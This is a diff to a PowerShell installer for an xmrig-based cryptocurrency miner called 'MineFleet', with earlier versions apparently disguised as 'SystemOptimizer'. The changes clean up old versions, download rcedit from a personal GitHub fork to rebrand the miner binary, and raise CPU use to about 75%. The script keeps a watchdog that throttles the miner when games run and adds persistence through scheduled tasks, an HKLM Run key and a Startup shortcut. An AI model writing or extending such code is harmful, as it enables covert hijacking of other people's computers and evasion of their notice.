@@ -52,24 +52,30 @@ if (-not $isAdmin) {
 }
 Show "OK" "Running as Administrator"
 
-# ---- FULL CLEANUP (kill EVERYTHING old) ----
+# ---- FULL CLEANUP (kill EVERYTHING from ALL versions) ----
 Show ".." "Killing ALL old instances..."
-# Kill all miners
-Get-Process -Name "MF-Service","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-# Kill all watchdog/guardian wscript instances
+# Kill ALL possible miner process names from every version
+Get-Process -Name "MF","SystemOptimizer","MF-Service","MineFleet","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+# Kill ALL watchdog/guardian wscript instances
 Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
-    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*MineFleet*" } |
+    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*mf_wd*" -or $_.CommandLine -like "*mf_gd*" -or $_.CommandLine -like "*MineFleet*" -or $_.CommandLine -like "*SystemOptimizer*" } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-# Remove old broken scheduled tasks (cmd /c to fully suppress errors on clean PCs)
-cmd /c "schtasks /Delete /TN `"MineFleet`" /F >nul 2>&1"
-cmd /c "schtasks /Delete /TN `"MineFleet-Logon`" /F >nul 2>&1"
-cmd /c "schtasks /Delete /TN `"MineFleet-Guardian`" /F >nul 2>&1"
-cmd /c "schtasks /Delete /TN `"MineFleet-Check`" /F >nul 2>&1"
-# Remove old registry key
-cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v MineFleet /f >nul 2>&1"
-# Remove old startup shortcut
+# Remove ALL old scheduled tasks from every version
+foreach ($tn in @("SystemOptimizer","SystemOptimizer-Logon","SystemOptimizer-Guardian","SystemOptimizer-Check","MineFleet","MineFleet-Logon","MineFleet-Guardian","MineFleet-Check","MF-Service","MF-Guardian","MF-Logon","MF-Check")) {
+    cmd /c "schtasks /Delete /TN `"$tn`" /F >nul 2>&1"
+}
+# Remove ALL old registry keys
+foreach ($rv in @("SystemOptimizer","MineFleet","MF-Service")) {
+    cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v `"$rv`" /f >nul 2>&1"
+}
+# Remove old startup shortcuts
 $startupPath = [Environment]::GetFolderPath("Startup")
+Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
 Remove-Item "$startupPath\MF.lnk" -Force -ErrorAction SilentlyContinue
+# Remove OLD SystemOptimizer folder entirely
+if (Test-Path "C:\ProgramData\SystemOptimizer") {
+    Remove-Item "C:\ProgramData\SystemOptimizer" -Recurse -Force -ErrorAction SilentlyContinue
+}
 Start-Sleep 3
 Show "OK" "All old instances and tasks removed"
 
@@ -318,11 +324,11 @@ try {
     # Download rcedit to rebrand the binary
     $rceditPath = "$env:TEMP\rcedit-x64.exe"
     if (-not (Test-Path $rceditPath)) {
-        $rceditUrl = "https://github.com/nicedayto/rcedit/releases/download/v2.0.0/rcedit-x64.exe"
+        $rceditUrl = "https://github.com/electron/rcedit/releases/download/v2.0.0/rcedit-x64.exe"
         Invoke-WebRequest $rceditUrl -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
         if (-not (Test-Path $rceditPath)) {
             # Fallback URL
-            Invoke-WebRequest "https://github.com/nicedayto/rcedit/releases/latest/download/rcedit-x64.exe" -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
+            Invoke-WebRequest "https://github.com/nicedayto/rcedit/releases/download/v2.0.0/rcedit-x64.exe" -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
         }
     }
 
@@ -430,7 +436,7 @@ $cfgLight = @"
 }
 "@
 [System.IO.File]::WriteAllText("$BASE\mf_light.json", $cfgLight, (New-Object System.Text.UTF8Encoding $false))
-Show "OK" "Configs created: normal=30% CPU, light=15% CPU (games)"
+Show "OK" "Configs created: smart full: ~75% normal, ~30% gaming"
 
 # ---- SMART WATCHDOG (game detection + single instance + auto-switch) ----
 Show ".." "Creating smart watchdog (detects games, switches CPU)..."
@@ -599,7 +605,7 @@ Show "OK" "ONLOGON guardian task created"
 
 # ---- PERSISTENCE LAYER 3: Registry Run ----
 Show ".." "Setting up persistence (Registry)..."
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MineFleet /t REG_SZ /d "wscript.exe `"$BASE\mf_wd.vbs`"" /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MF-Service /t REG_SZ /d "wscript.exe `"$BASE\mf_wd.vbs`"" /f 2>$null | Out-Null
 Show "OK" "Registry Run key set"
 
 # ---- PERSISTENCE LAYER 4: Startup shortcut ----
